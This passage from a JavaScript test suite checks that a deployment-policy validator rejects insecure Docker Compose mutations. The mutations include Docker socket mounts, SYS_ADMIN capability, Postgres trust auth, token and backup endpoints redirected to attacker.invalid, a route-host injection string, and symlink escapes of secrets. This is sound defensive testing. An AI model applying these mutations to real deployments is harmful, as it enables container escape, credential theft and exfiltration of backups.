    freezeReleaseTree(sandbox.root);
    assert.equal(
      fs.statSync(path.join(sandbox.root, "config", "no-hosted-workloads.local-private.lock.json")).mode & 0o777,
      0o444,
    );
    assert.equal(
      fs.statSync(path.join(sandbox.root, "postgres", "entrypoint-with-init-secrets.sh")).mode & 0o777,
      0o555,
    );
    const violations = validateNoHostedCoreAuthority(
      fixture.lock,
      fixture.config,
      sandbox.root,
      fixture.environment,
    );
    assert.deepEqual(violations, [], `immutable release authority rejected: ${violations.join(",")}`);

    const missingRuntimeLockEnvironment = new Map(fixture.environment);
    missingRuntimeLockEnvironment.delete("HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE");
    assert.ok(
      validateNoHostedCoreAuthority(
        fixture.lock,
        fixture.config,
        sandbox.root,
        missingRuntimeLockEnvironment,
      ).includes("local-private:runtime-lock-authority"),
      "a missing semantic runtime-lock binding escaped LOCAL_PRIVATE authority",
    );
    const wrongRuntimeLockEnvironment = new Map(fixture.environment);
    wrongRuntimeLockEnvironment.set("HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE", sandbox.canonicalLock);
    assert.ok(
      validateNoHostedCoreAuthority(
        fixture.lock,
        fixture.config,
        sandbox.root,
        wrongRuntimeLockEnvironment,
      ).includes("local-private:runtime-lock-authority"),
      "a different semantic runtime-lock binding escaped LOCAL_PRIVATE authority",
    );

    const unrelatedRepositoryBind = fixture.config.services.prometheus.volumes.find(
      (mount) => mount?.type === "bind" && mount.target === "/etc/prometheus/prometheus.yml",
    );
    assert.ok(unrelatedRepositoryBind, "prometheus repository bind fixture drifted");
    fs.chmodSync(unrelatedRepositoryBind.source, 0o400);
    assert.ok(
      validateNoHostedCoreAuthority(
        fixture.lock,
        fixture.config,
        sandbox.root,
        fixture.environment,
      ).includes("prometheus:repository-bind-authority"),
      "the projected-bind exception leaked to an unrelated repository bind",
    );
    fs.chmodSync(unrelatedRepositoryBind.source, 0o444);

    fs.chmodSync(
      path.join(sandbox.root, "config", "no-hosted-workloads.local-private.lock.json"),
      0o400,
    );
    assert.ok(
      validateNoHostedCoreAuthority(
        fixture.lock,
        fixture.config,
        sandbox.root,
        fixture.environment,
      ).includes("local-private:runtime-lock-authority"),
      "an unlisted runtime-lock mode escaped the exact immutable-mode pair",
    );
  } finally {
    thawReleaseTree(sandbox.root);
    removeSandbox(sandbox);
  }
});

test("LOCAL_PRIVATE wrapper renders once against its exact lock and semantic environment", () => {
  const sandbox = createConsumerSandbox();
  try {
    const { config, environment } = localPrivateQa8Fixture(sandbox);
    const environmentBytes = `${[...environment.entries()]
      .map(([key, value]) => `${key}=${value}`)
      .join("\n")}\n`;
    fs.writeFileSync(sandbox.environmentFile, environmentBytes, { mode: 0o600 });
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
    const result = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(result.status, 0, result.stderr);
    assert.deepEqual(JSON.parse(result.stdout), config);
    assert.match(
      fs.readFileSync(sandbox.dockerArgumentsCapture, "utf8"),
      /-f compose\.runtime-isolation\.yaml -f compose\.local-private\.yaml --profile backup config --format json/,
    );
  } finally {
    removeSandbox(sandbox);
  }
});

test("LOCAL_PRIVATE projected archive bind exceptions remain exact across tuple and external-mode drift", () => {
  const scenarios = [
    ["source", ({ config }) => {
      const certificateMount = config.services.waf.volumes
        .find((mount) => mount.target === "/etc/nginx/conf/server.crt");
      const privateKeyMount = config.services.waf.volumes
        .find((mount) => mount.target === "/etc/nginx/conf/server.key");
      certificateMount.source = privateKeyMount.source;
    }, "waf:local-private-mount-/etc/nginx/conf/server.crt"],
    ["read-only", ({ config }) => {
      config.services.waf.volumes
        .find((mount) => mount.target === "/etc/nginx/conf/server.crt").read_only = false;
    }, "waf:local-private-mount-/etc/nginx/conf/server.crt"],
    ["target", ({ config }) => {
      config.services.waf.volumes
        .find((mount) => mount.target === "/etc/nginx/conf/server.crt").target =
          "/etc/nginx/conf/server.crt.drift";
    }, "waf:local-private-mount-/etc/nginx/conf/server.crt"],
    ["service", ({ config }) => {
      const volumes = config.services["control-center"].volumes;
      const index = volumes.findIndex((mount) => mount.target === "/var/www/project-state");
      assert.notEqual(index, -1, "control-center state mount fixture drifted");
      config.services.prometheus.volumes.push(...volumes.splice(index, 1));
    }, "control-center:local-private-mount-/var/www/project-state"],
    ["certificate mode", ({ config }) => {
      fs.chmodSync(
        config.services.waf.volumes
          .find((mount) => mount.target === "/etc/nginx/conf/server.crt").source,
        0o600,
      );
    }, "local-private:certificate-authority"],
    ["state mode", ({ environment }) => {
      fs.chmodSync(environment.get("PLATFORM_STATE_DIR"), 0o770);
    }, "local-private:state-directory-authority"],
  ];
  for (const [label, mutate, expectedViolation] of scenarios) {
    const sandbox = createConsumerSandbox();
    try {
      const fixture = localPrivateQa8Fixture(sandbox);
      for (const excludedPath of ["projects-portal/state", "traefik/certs"]) {
        fs.rmSync(path.join(sandbox.root, excludedPath), { recursive: true, force: true });
      }
      freezeReleaseTree(sandbox.root);
      mutate(fixture);
      const violations = validateNoHostedCoreAuthority(
        fixture.lock,
        fixture.config,
        sandbox.root,
        fixture.environment,
      );
      assert.ok(
        violations.includes(expectedViolation),
        `${label} did not revoke the projected bind exception: ${violations.join(",")}`,
      );
    } finally {
      thawReleaseTree(sandbox.root);
      removeSandbox(sandbox);
    }
  }
});

test("LOCAL_PRIVATE source authority is the fixed filesystem-authoritative sibling of PLATFORM_DATA_ROOT", () => {
  const scenarios = [
    ["PHP source drift", ({ environment, sandbox }) => {
      environment.set("PHP_PROJECTS_DIR", path.join(sandbox.cleanupRoot, "compose-source"));
    }],
    ["project source drift", ({ environment, sandbox }) => {
      environment.set("PROJECT_SOURCE_DIR", path.join(sandbox.cleanupRoot, "compose-source"));
    }],
    ["alternative sibling", ({ config, environment, sandbox, sourceDirectory }) => {
      const alternative = path.join(sandbox.cleanupRoot, "compose-source");
      environment.set("PHP_PROJECTS_DIR", alternative);
      environment.set("PROJECT_SOURCE_DIR", alternative);
      for (const service of Object.values(config.services)) {
        for (const mount of service.volumes ?? []) {
          if (mount?.type === "bind" && mount.source === sourceDirectory) {
            mount.source = alternative;
          }
        }
      }
    }],
    ["relative source", ({ environment }) => {
      environment.set("PHP_PROJECTS_DIR", "../src");
      environment.set("PROJECT_SOURCE_DIR", "../src");
    }],
    ["missing project source", ({ environment }) => {
      environment.delete("PROJECT_SOURCE_DIR");
    }],
    ["group-writable source", ({ sourceDirectory }) => {
      fs.chmodSync(sourceDirectory, 0o770);
    }],
    ["symlink source", ({ sandbox, sourceDirectory }) => {
      fs.rmSync(sourceDirectory, { recursive: true });
      fs.symlinkSync(path.join(sandbox.cleanupRoot, "compose-source"), sourceDirectory);
    }],
  ];
  for (const [label, mutate] of scenarios) {
    const sandbox = createConsumerSandbox();
    try {
      const fixture = localPrivateQa8Fixture(sandbox);
      mutate({ ...fixture, sandbox });
      const violations = validateNoHostedCoreAuthority(
        fixture.lock,
        fixture.config,
        sandbox.root,
        fixture.environment,
      );
      assert.ok(
        violations.includes("local-private:project-source-authority"),
        `${label} escaped the fixed source authority: ${violations.join(",")}`,
      );
    } finally {
      removeSandbox(sandbox);
    }
  }
});

test("LOCAL_PRIVATE authority rejects setup, path, lock and raw-scheduler widening mutants", () => {
  const sandbox = createConsumerSandbox();
  try {
    const baseline = localPrivateQa8Fixture(sandbox);
    const mutations = [
      ["setup secret", (config) => {
        delete config.secrets.control_center_first_configuration_bootstrap_token;
      }],
      ["first configuration mode", (config) => {
        config.services["control-center"].environment.CONTROL_CENTER_FIRST_CONFIGURATION_MODE = "optional";
      }],
      ["identity host", (config) => {
        config.services["control-center"].extra_hosts = ["attacker.invalid=host-gateway"];
      }],
      ["state mount", (config) => {
        config.services["project-router"].volumes
          .find((mount) => mount.target === "/var/www/project-state").source = "/tmp/attacker";
      }],
      ["project source mount", (config) => {
        config.services["project-router"].volumes
          .find((mount) => mount.target === "/var/www/projects").source =
            path.join(sandbox.cleanupRoot, "compose-source");
      }],
      ["runtime lock", (config) => {
        config.services["broker-auth-bootstrap"].volumes
          .find((mount) => mount.target === "/run/platform/hosted-workloads.lock.json").source =
            sandbox.canonicalLock;
      }],
      ["project-router compatibility mode", (config) => {
        config.services["project-router"].environment
          .PROJECT_ROUTER_LOCAL_PRIVATE_COMPATIBILITY_MODE = "false";
      }],
      ["project-router compatibility allowlist", (config) => {
        config.services["project-router"].environment.PROJECT_ROUTER_ALLOWED_UPSTREAMS +=
          ",attacker:8080";
      }],
      ["mariadb compatibility alias", (config) => {
        config.services.mariadb.networks.platform_db_admin.aliases = ["attacker.local"];
      }],
      ["base secret path collision", (config) => {
        config.secrets.control_center_database_url.file =
          config.secrets.control_center_vault_keys.file;
      }],
      ["raw scheduler", (config) => {
        config.services["backup-scheduler"].volumes.push({
          type: "bind",
          source: "/var/run/docker.sock",
          target: "/var/run/docker.sock",
        });
      }],
    ];
    const accepted = [];
    for (const [label, mutate] of mutations) {
      const config = structuredClone(baseline.config);
      mutate(config);
      const violations = validateNoHostedCoreAuthority(
        baseline.lock,
        config,
        sandbox.root,
        baseline.environment,
      );
      if (violations.length === 0) accepted.push(label);
    }
    assert.deepEqual(accepted, [], `LOCAL_PRIVATE mutants escaped authority: ${accepted.join(",")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("LOCAL_PRIVATE external base-secret authority rejects collision, missing and wrong-mode files", () => {
  const scenarios = [
    ["collision", ({ config }) => {
      config.secrets.control_center_database_url.file =
        config.secrets.control_center_vault_keys.file;
    }, "secrets:local-private-file-path-collision"],
    ["missing", ({ config }) => {
      fs.rmSync(config.secrets.redis_password.file);
    }, "secret:redis_password:local-private-external-authority"],
    ["mode", ({ config }) => {
      fs.chmodSync(config.secrets.smtp_password.file, 0o644);
    }, "secret:smtp_password:local-private-external-authority"],
  ];
  for (const [label, mutate, expectedViolation] of scenarios) {
    const sandbox = createConsumerSandbox();
    try {
      const fixture = localPrivateQa8Fixture(sandbox);
      mutate(fixture);
      const violations = validateNoHostedCoreAuthority(
        fixture.lock,
        fixture.config,
        sandbox.root,
        fixture.environment,
      );
      assert.ok(
        violations.includes(expectedViolation),
        `${label} did not produce ${expectedViolation}: ${violations.join(",")}`,
      );
    } finally {
      removeSandbox(sandbox);
    }
  }
});

test("QA8 exact overlay golden is pinned by the v2 normalized render digest", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const config = qa8IndependentGolden(sandbox);
    materializeQa8CanonicalSources(sandbox, config);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const result = evaluateCurrentNoHostedExactAuthority(
      lock,
      config,
      sandbox.root,
      environment,
    );
    assert.deepEqual(result.violations, [], `golden pre-digest validation failed: ${result.violations}`);
    assert.equal(
      result.normalizedSha256,
      coreSemanticPolicyDescriptor.currentAuthority.normalizedRenderSha256,
    );
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 privileged broker surfaces reject socket, CAS, secret, identity and process mutants before digest", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const baseline = qa8IndependentGolden(sandbox);
    materializeQa8CanonicalSources(sandbox, baseline);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const mutations = [
      ["bootstrap raw socket", (config) => config.services["broker-auth-bootstrap"].volumes.push({
        type: "bind",
        source: "/var/run/docker.sock",
        target: "/var/run/docker.sock",
        read_only: true,
        bind: {},
      })],
      ["sidecar raw socket", (config) => config.services["docker-action-activation-sidecar"].volumes.push({
        type: "bind",
        source: "/var/run/docker.sock",
        target: "/var/run/docker.sock",
        read_only: true,
        bind: {},
      })],
      ["sidecar CAS read-only", (config) => {
        config.services["docker-action-activation-sidecar"].volumes
          .find((mount) => mount.source === "docker_action_activation_cas").read_only = true;
      }],
      ["broker secret mode", (config) => {
        config.services["docker-action-broker"].secrets[0].mode = "0444";
      }],
      ["broker socket removed", (config) => {
        config.services["docker-action-broker"].volumes = config.services["docker-action-broker"].volumes
          .filter((mount) => mount.source !== "docker_action_broker_socket");
      }],
      ["bootstrap network", (config) => {
        config.services["broker-auth-bootstrap"].network_mode = "bridge";
      }],
      ["broker mutable image", (config) => {
        config.services["docker-action-broker"].image = "registry.example.invalid/platform/docker-action-broker:latest";
      }],
      ["broker non-root user", (config) => {
        config.services["docker-action-broker"].user = "1000:1000";
      }],
      ["broker added capability", (config) => {
        config.services["docker-action-broker"].cap_add = ["SYS_ADMIN"];
      }],
      ["broker command", (config) => {
        config.services["docker-action-broker"].command = ["sh"];
      }],
      ["broker healthcheck", (config) => {
        config.services["docker-action-broker"].healthcheck.test = ["CMD", "true"];
      }],
      ["sidecar entrypoint", (config) => {
        config.services["docker-action-activation-sidecar"].entrypoint = ["sh"];
      }],
      ["bootstrap command", (config) => {
        config.services["broker-auth-bootstrap"].command = ["all", "--lock", "/tmp/attacker"];
      }],
    ];
    const accepted = [];
    for (const [label, mutate] of mutations) {
      const config = structuredClone(baseline);
      mutate(config);
      const result = evaluateCurrentNoHostedExactAuthority(
        lock,
        config,
        sandbox.root,
        environment,
      );
      if (result.violations.length === 0) accepted.push(label);
    }
    assert.deepEqual(accepted, [], `privileged mutants escaped pre-digest checks: ${accepted}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 v2 dynamic projections preserve one digest and reject hidden authority widening", () => {
  const sandbox = createConsumerSandbox();
  try {
    const baseEnvironment = installQa8Environment(sandbox);
    const baseline = qa8IndependentGolden(sandbox);
    materializeQa8CanonicalSources(sandbox, baseline);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const baseResult = evaluateCurrentNoHostedExactAuthority(
      lock,
      baseline,
      sandbox.root,
      baseEnvironment,
    );
    assert.deepEqual(baseResult.violations, []);

    const releaseEnvironment = new Map(baseEnvironment);
    const releaseValues = {
      PLATFORM_RUNTIME_CANDIDATE_ID: "1".repeat(64),
      PLATFORM_RUNTIME_COMMIT: "2".repeat(40),
      PLATFORM_RUNTIME_TREE: "3".repeat(40),
      PLATFORM_RUNTIME_DEPLOYMENT_ID: "deployment.qa8-release",
      PLATFORM_RUNTIME_SOURCE_RENDER_SHA256: "4".repeat(64),
      PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256: "5".repeat(64),
    };
    for (const [key, value] of Object.entries(releaseValues)) {
      releaseEnvironment.set(key, value);
    }
    releaseEnvironment.set("PROMETHEUS_RETENTION_TIME", "30d");
    releaseEnvironment.set("ALERTMANAGER_SECRET_GID", "2000");
    const releaseLabels = {
      "com.platform.runtime.candidate-id": releaseValues.PLATFORM_RUNTIME_CANDIDATE_ID,
      "com.platform.runtime.commit": releaseValues.PLATFORM_RUNTIME_COMMIT,
      "com.platform.runtime.tree": releaseValues.PLATFORM_RUNTIME_TREE,
      "com.platform.runtime.deployment-id": releaseValues.PLATFORM_RUNTIME_DEPLOYMENT_ID,
      "com.platform.runtime.source-render-sha256": releaseValues.PLATFORM_RUNTIME_SOURCE_RENDER_SHA256,
      "com.platform.runtime.workload-lock-sha256": releaseValues.PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256,
    };
    const releaseConfig = structuredClone(baseline);
    releaseConfig["x-platform-runtime-labels"] = structuredClone(releaseLabels);
    for (const service of Object.values(releaseConfig.services)) {
      service.labels = structuredClone(releaseLabels);
    }
    releaseConfig.services.prometheus.command[2] = "--storage.tsdb.retention.time=30d";
    releaseConfig.services.alertmanager.group_add = ["2000"];
    const releaseResult = evaluateCurrentNoHostedExactAuthority(
      lock,
      releaseConfig,
      sandbox.root,
      releaseEnvironment,
    );
    assert.deepEqual(releaseResult.violations, []);
    assert.equal(releaseResult.normalizedSha256, baseResult.normalizedSha256);

    const outsideSecret = path.join(sandbox.root, "outside-secret.txt");
    fs.writeFileSync(outsideSecret, "outside\n", { mode: 0o600 });
    fs.chmodSync(outsideSecret, 0o600);
    const portalHost = "portal.fixture.invalid";
    const replacePortalHost = (value, replacement) => {
      if (Array.isArray(value)) return value.map((entry) => replacePortalHost(entry, replacement));
      if (value && typeof value === "object") {
        return Object.fromEntries(Object.entries(value).map(([key, entry]) => [
          key,
          replacePortalHost(entry, replacement),
        ]));
      }
      return typeof value === "string" ? value.replaceAll(portalHost, replacement) : value;
    };
    const mutants = [
      ["volume physical collision", (config, environment) => {
        environment.set("MARIADB_DATA_VOLUME", "enterprise_postgres_data");
        config.volumes.enterprise_mariadb_data.name = "enterprise_postgres_data";
      }],
      ["secret file collision", (config, environment) => {
        environment.set(
          "CONTROL_CENTER_DATABASE_URL_SECRET_FILE",
          "secrets/control_center_vault_keys.txt",
        );
        config.secrets.control_center_database_url.file =
          config.secrets.control_center_vault_keys.file;
      }],
      ["secret outside canonical directory", (config, environment) => {
        environment.set("CONTROL_CENTER_DATABASE_URL_SECRET_FILE", "outside-secret.txt");
        config.secrets.control_center_database_url.file = outsideSecret;
      }],
      ["WAF rule engine off", (config, environment) => {
        environment.set("WAF_MODSEC_RULE_ENGINE", "Off");
        config.services.waf.environment.MODSEC_RULE_ENGINE = "Off";
      }],
      ["WAF paranoia out of range", (config, environment) => {
        environment.set("WAF_BLOCKING_PARANOIA", "0");
        config.services.waf.environment.BLOCKING_PARANOIA = "0";
      }],
      ["WAF detection below blocking", (config, environment) => {
        environment.set("WAF_BLOCKING_PARANOIA", "4");
        environment.set("WAF_DETECTION_PARANOIA", "2");
        config.services.waf.environment.BLOCKING_PARANOIA = "4";
      }],
      ["WAF duplicate published bind", (config, environment) => {
        environment.set("WAF_HTTPS_BIND", "0.0.0.0:80");
        config.services.waf.ports[1].host_ip = "0.0.0.0";
        config.services.waf.ports[1].published = "80";
      }],
      ["WAF non-IP published bind", (config, environment) => {
        environment.set("WAF_HTTP_BIND", "attacker.invalid:80");
        config.services.waf.ports[0].host_ip = "attacker.invalid";
      }],
      ["scheduler non-boolean enable", (config, environment) => {
        environment.set("BACKUP_SCHEDULER_ENABLE_OFFSITE", "yes");
        config.services["backup-scheduler"].environment.BACKUP_SCHEDULER_ENABLE_OFFSITE = "yes";
      }],
      ["malformed ops image repository", (config, environment) => {
        const image = `registry.example.invalid/platform/ops@@sha256:${"f".repeat(64)}`;
        environment.set("PLATFORM_OPS_IMAGE", image);
        config.services["broker-auth-bootstrap"].image = image;
      }],
      ["route host expression injection", (config, environment) => {
        const injected = "portal.fixture.invalid`) || Host(`attacker.invalid";
        environment.set("CONTROL_CENTER_HOST", injected);
        Object.assign(config, replacePortalHost(config, injected));
      }],
    ];
    const escaped = [];
    for (const [label, mutate] of mutants) {
      const config = structuredClone(baseline);
      const environment = new Map(baseEnvironment);
      mutate(config, environment);
      const result = evaluateCurrentNoHostedExactAuthority(
        lock,
        config,
        sandbox.root,
        environment,
      );
      if (result.violations.length === 0) escaped.push(label);
    }
    assert.deepEqual(escaped, [], `dynamic authority mutants escaped: ${escaped}`);

    const precedenceEnvironment = new Map(baseEnvironment);
    const precedenceHost = "console.fixture.invalid";
    precedenceEnvironment.set("CONTROL_CENTER_HOST", precedenceHost);
    const precedenceConfig = structuredClone(baseline);
    precedenceConfig.configs.enterprise_traefik_routes.content =
      precedenceConfig.configs.enterprise_traefik_routes.content.replace(
        "Host(`portal.fixture.invalid`)",
        `Host(\`${precedenceHost}\`)`,
      );
    precedenceConfig.services["control-center"].environment.CONTROL_CENTER_HOST = precedenceHost;
    precedenceConfig.services["control-center"].environment.CONTROL_CENTER_OIDC_REDIRECT_URI =
      `https://${precedenceHost}/auth/callback`;
    precedenceConfig.services["control-center"].environment.CONTROL_CENTER_PUBLIC_ORIGIN =
      `https://${precedenceHost}`;
    precedenceConfig.services["project-router"].environment.CONTROL_CENTER_HOST = precedenceHost;
    precedenceConfig.services["control-center"].environment.ADMIN_HOST =
      baseline.services["control-center"].environment.ADMIN_HOST;
    precedenceConfig.services["project-router"].environment.ADMIN_HOST =
      baseline.services["project-router"].environment.ADMIN_HOST;
    const precedenceResult = evaluateCurrentNoHostedExactAuthority(
      lock,
      precedenceConfig,
      sandbox.root,
      precedenceEnvironment,
    );
    assert.deepEqual(precedenceResult.violations, []);
    assert.equal(precedenceResult.normalizedSha256, baseResult.normalizedSha256);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 exact environment authority rejects same-name security and endpoint widening", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const baseline = selectQa8AcceptedBaseline(sandbox, lock, environment);
    materializeQa8CanonicalSources(sandbox, baseline.config);
    assert.deepEqual(
      validateNoHostedCoreAuthority(lock, baseline.config, sandbox.root, environment),
      [],
      "selected independent baseline is not accepted before mutation",
    );
    const mutations = [
      ["postgres trust", "postgres", "POSTGRES_HOST_AUTH_METHOD", "trust"],
      ["keycloak non-strict", "keycloak", "KC_HOSTNAME_STRICT", "false"],
      ["grafana anonymous", "grafana", "GF_AUTH_ANONYMOUS_ENABLED", "true"],
      [
        "control-center token endpoint",
        "control-center",
        "CONTROL_CENTER_OIDC_TOKEN_ENDPOINT",
        "https://attacker.invalid/token",
      ],
      ["waf method widening", "waf", "ALLOWED_METHODS", "GET HEAD POST TRACE CONNECT"],
      [
        "scheduler repository redirect",
        "backup-scheduler",
        "RESTIC_REPOSITORY",
        "s3:https://attacker.invalid/backup",
      ],
    ];
    const accepted = [];
    for (const [label, serviceName, key, value] of mutations) {
      const config = structuredClone(baseline.config);
      config.services[serviceName].environment ??= {};
      config.services[serviceName].environment[key] = value;
      const violations = validateNoHostedCoreAuthority(
        lock,
        config,
        sandbox.root,
        environment,
      );
      if (!violations.some((violation) =>
        violation.includes(serviceName) && violation.includes("environment"))) {
        accepted.push(label);
      }
    }
    assert.deepEqual(accepted, [], `same-name environment widening was accepted: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 environment widening cannot reach core create or start", () => {
  const fixture = createConsumerSandbox();
  let baselineConfig;
  try {
    const environment = installQa8Environment(fixture);
    const lock = JSON.parse(fs.readFileSync(fixture.canonicalLock, "utf8"));
    baselineConfig = selectQa8AcceptedBaseline(fixture, lock, environment).config;
    materializeQa8CanonicalSources(fixture, baselineConfig);
  } finally {
    removeSandbox(fixture);
  }
  const baselineScenario = runCoreStackNoHostedScenario(
    baselineConfig,
    { materializeSources: true },
  );
  try {
    const createCalls = baselineScenario.log.split("\n")
      .filter((line) => /(?:^| )create(?: |$)/.test(line));
    const startCalls = baselineScenario.log.split("\n")
      .filter((line) => /^--host unix:\/\/\/var\/run\/docker\.sock start(?: |$)/.test(line));
    assert.equal(baselineScenario.result.status, 0, baselineScenario.result.stderr);
    assert.equal(createCalls.length, 1, `baseline create count: ${baselineScenario.log}`);
    assert.equal(startCalls.length, 1, `baseline start count: ${baselineScenario.log}`);
  } finally {
    fs.rmSync(baselineScenario.root, { recursive: true, force: true });
  }
  const accepted = [];
  for (const [label, serviceName, mutate] of [
    ["postgres trust", "postgres", (config) => {
      config.services.postgres.environment.POSTGRES_HOST_AUTH_METHOD = "trust";
    }],
    ["grafana anonymous", "grafana", (config) => {
      config.services.grafana.environment.GF_AUTH_ANONYMOUS_ENABLED = "true";
    }],
  ]) {
    const config = structuredClone(baselineConfig);
    mutate(config);
    const scenario = runCoreStackNoHostedScenario(config, { materializeSources: true });
    try {
      const createCalls = scenario.log.split("\n").filter((line) => /(?:^| )create(?: |$)/.test(line));
      const startCalls = scenario.log.split("\n").filter((line) =>
        /^--host unix:\/\/\/var\/run\/docker\.sock start(?: |$)/.test(line));
      if (scenario.result.status === 0 || createCalls.length > 0 || startCalls.length > 0) {
        accepted.push({
          label,
          status: scenario.result.status,
          create: createCalls.length,
          start: startCalls.length,
        });
      } else {
        assert.match(
          scenario.result.stderr,
          new RegExp(`semantic authority.*${serviceName}.*environment`, "is"),
          `${label} failed before Engine sinks for an unrelated reason:\n${scenario.result.stderr}`,
        );
      }
    } finally {
      fs.rmSync(scenario.root, { recursive: true, force: true });
    }
  }
  assert.deepEqual(accepted, [], `environment widening reached Engine sinks: ${JSON.stringify(accepted)}`);
});

test("QA8 exact service and top-level authority rejects every safe-looking semantic drift", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const baseline = selectQa8AcceptedBaseline(sandbox, lock, environment);
    materializeQa8CanonicalSources(sandbox, baseline.config);
    assert.deepEqual(
      validateNoHostedCoreAuthority(lock, baseline.config, sandbox.root, environment),
      [],
      "selected independent baseline is not accepted before mutation",
    );
    const mutations = [
      ["pids_limit", /postgres/i, (config) => {
        config.services.postgres.pids_limit = 2_147_483_647;
      }],
      ["working_dir", /postgres/i, (config) => { config.services.postgres.working_dir = "/tmp"; }],
      ["init", /postgres/i, (config) => { config.services.postgres.init = false; }],
      ["expose", /postgres/i, (config) => { config.services.postgres.expose = [65_535]; }],
      ["cpus", /postgres/i, (config) => { config.services.postgres.cpus = 999; }],
      ["cpu_shares", /postgres/i, (config) => { config.services.postgres.cpu_shares = 262_144; }],
      ["memory tuple", /postgres/i, (config) => {
        config.services.postgres.mem_limit = 512 * 1024 * 1024;
        config.services.postgres.mem_reservation = 511 * 1024 * 1024;
        config.services.postgres.memswap_limit = 512 * 1024 * 1024;
      }],
      ["blkio", /postgres/i, (config) => {
        config.services.postgres.blkio_config = { weight: 1000 };
      }],
      ["ulimit", /postgres/i, (config) => {
        config.services.postgres.ulimits = { nofile: { soft: 65_536, hard: 65_536 } };
      }],
      ["numeric user", /postgres/i, (config) => { config.services.postgres.user = "1:1"; }],
      ["cap_drop presence", /postgres/i, (config) => {
        config.services.postgres.cap_drop = ["ALL"];
      }],
      ["volume labels", /volume.*enterprise_postgres_data/i, (config) => {
        config.volumes.enterprise_postgres_data.labels = { "qa8.attacker": "true" };
      }],
      ["network options", /network.*platform_postgres/i, (config) => {
        Object.assign(config.networks.platform_postgres, {
          driver: "bridge",
          attachable: false,
          enable_ipv4: true,
          enable_ipv6: false,
        });
      }],
      ["unknown document field", /(?:document|top|field|config)/i, (config) => {
        config["x-qa8-attacker"] = {};
      }],
    ];
    const accepted = [];
    for (const [label, _violationPattern, mutate] of mutations) {
      const config = structuredClone(baseline.config);
      mutate(config);
      const violations = validateNoHostedCoreAuthority(
        lock,
        config,
        sandbox.root,
        environment,
      );
      if (violations.length === 0) accepted.push(label);
      assert.ok(
        violations.includes("render:exact-authority-digest"),
        `${label} did not reach the exact residual render digest: ${violations.join(",")}`,
      );
    }
    assert.deepEqual(accepted, [], `semantic authority drift was accepted: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 secret and root bind ancestry cannot escape through a symlinked parent", () => {
  const outcomes = [];
  for (const mode of ["secret", "bind"]) {
    const sandbox = createConsumerSandbox();
    try {
      const environment = installQa8Environment(sandbox);
      const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
      const config = selectQa8AcceptedBaseline(sandbox, lock, environment).config;
      materializeQa8CanonicalSources(sandbox, config);
      const bytes = `${JSON.stringify(config)}\n`;
      writeDockerOutput(sandbox, bytes);
      const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(baseline.status, 0, baseline.stderr);
      assert.equal(baseline.stdout, bytes, `${mode} baseline bytes changed`);
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const outside = path.join(sandbox.cleanupRoot, `outside-${mode}`);
      if (mode === "secret") {
        fs.renameSync(path.join(sandbox.root, "secrets"), outside);
        fs.symlinkSync(outside, path.join(sandbox.root, "secrets"), "dir");
      } else {
        fs.renameSync(path.join(sandbox.root, "alertmanager"), outside);
        fs.symlinkSync(outside, path.join(sandbox.root, "alertmanager"), "dir");
        assert.equal(
          config.services.alertmanager.volumes.some((mount) =>
            mount.source === path.join(sandbox.root, "alertmanager", "alertmanager.yml")),
          true,
          "bind escape fixture does not use the lexical root path",
        );
      }
      const escapedLeaf = mode === "secret"
        ? config.secrets.control_center_database_url.file
        : path.join(sandbox.root, "alertmanager", "alertmanager.yml");
      assert.equal(
        fs.realpathSync.native(escapedLeaf).startsWith(`${sandbox.root}${path.sep}`),
        false,
        `${mode} parent symlink did not escape the canonical root`,
      );
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      if (result.status !== 0) {
        assert.equal(result.stdout, "", `${mode} authority failure leaked rendered bytes`);
        assert.match(
          result.stderr,
          /(?:secret|bind|path|symlink|authority)/i,
          `${mode} escape failed for an unrelated reason:\n${result.stderr}`,
        );
      }
      outcomes.push({
        mode,
        status: result.status,
        stdoutBytes: result.stdout.length,
      });
    } finally {
      removeSandbox(sandbox);
    }
  }
  assert.deepEqual(
    outcomes,
    [
      { mode: "secret", status: 1, stdoutBytes: 0 },
      { mode: "bind", status: 1, stdoutBytes: 0 },
    ],
    `symlink ancestry escaped core authority: ${JSON.stringify(outcomes)}`,
  );
});

test("QA8 Compose render bytes use pre-bound FDs after unlinking the renderer pathname", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const config = selectQa8AcceptedBaseline(sandbox, lock, environment).config;
    materializeQa8CanonicalSources(sandbox, config);
    const originalBytes = `${JSON.stringify(config)}\n`;
    const replacementBytes = `${JSON.stringify(config, null, 2)}\n`;
    writeDockerOutput(sandbox, originalBytes);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(baseline.stdout, originalBytes, "baseline wrapper changed renderer bytes");
